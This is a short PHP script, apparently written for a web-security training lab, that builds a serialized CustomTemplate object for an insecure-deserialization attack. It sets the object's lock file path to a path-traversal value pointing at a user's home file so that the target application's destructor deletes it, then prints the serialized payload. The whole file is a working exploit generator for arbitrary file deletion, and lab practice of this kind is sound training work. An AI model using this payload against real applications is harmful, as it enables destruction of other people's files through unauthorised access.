<?php

class CustomTemplate {
    var $template_file_path;
    var $lock_file_path;

    function __destruct() {
        // Carlos thought this would be a good idea
       // if (file_exists($this->lock_file_path)) {
          //  unlink($this->lock_file_path);
        //}

        //echo $this->lock_file_path;
    }
}

$payload = new CustomTemplate();
$payload->lock_file_path = '../../../../home/carlos/morale.txt';
$payload->template_file_path = 'test.txt';

echo serialize($payload);

?>